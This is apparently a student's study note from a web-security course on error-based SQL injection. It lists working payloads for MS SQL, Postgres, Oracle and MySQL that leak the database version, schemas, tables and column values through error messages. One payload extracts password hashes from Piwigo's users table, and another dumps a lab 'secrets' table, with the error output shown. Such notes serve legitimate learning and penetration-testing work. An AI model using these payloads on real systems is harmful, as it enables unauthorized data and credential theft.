---
tags:
- sqlInjection
---
# SQL Injection Error based payloads
If an application shows detail information in error message we can find something interesting uses it. 

Force erroneous data type conversions. We can use cast() function, example
MS SQL
```sql
cast(@@version as integer)
```
Postgres
```sql
cast(version() as integer)
```
Oracle
```sql
to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
```
Mysql
```mysql
extractvalue('',concat('>',version()));
```
List of sql injection see here [[202305051825099 SQL Injection Error based payloads#^f19401]] [[202305051825099 SQL Injection Error based payloads#^da2ed6]]

## Getting version from error message 
```sql
 asc,+extractvalue('',concat('>',version()))
```

## Getting schemas from error messages
```sql
 asc, extractvalue('',concat('>',(
    select group_concat(table_schema) 
    from (
          select table_schema 
      from information_schema.tables 
      group by table_schema) 
    as foo)
    )
  )
```

## Getting password part from error messages
```sql
asc, extractvalue('',concat('>',(select substring(password,1,32) from piwigo_users limit 1 offset 0)))
```


## Example with MSSQL getting information from error
Databases:
```sql
(select STRING_AGG(CONCAT(name, ':', [name]), ', ') from sys.Databases)
```
Example of result:
```
{"error": "('22018', \"[22018] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Conversion failed when converting the nvarchar value 'master:master, tempdb:tempdb, model:model, msdb:msdb, app:app, exercise:exercise, sqlmap:sqlmap' to data type bit. (245) (SQLExecDirectW)\")"}
```
Tables:

```sql
(SELECT STRING_AGG(CONCAT(TABLE_NAME, ':', [TABLE_NAME]), ', ')
FROM exercise.information_schema.tables 
GROUP BY TABLE_CATALOG)
```

Columns:
```sql
select STRING_AGG(CONCAT(COLUMN_NAME, ':', [COLUMN_NAME]), ', ') from exercise.information_schema.columns where TABLE_NAME = 'secrets';
```
Values:
```sql
(select STRING_AGG(CONCAT(flag, ':', [id]), ', ') from exercise.dbo.secrets)
```
See more payloads  [[202305051825099 SQL Injection Error based payloads#^da2ed6]]
## References

1. web200.SQL Injection.Exploiting SQL Injection. Error-based Payloads
2. (Swissky, et al, 2021) [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md) ^f19401
3. (NetSPI, 2019), [https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysq](https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql) ^da2ed6
4. (The MITRE Corporation, 2021), [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32615](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32615) [↩︎](https://portal.offsec.com/courses/web-200/books-and-videos/modal/modules/sql-injection/case-study-error-based-sqli-in-piwigo/case-study-error-based-sqli-in-piwigo#fnref2) ^dd17cd
5. web200.SQL Injection.Case Study: Error-based SQLi in Piwigo

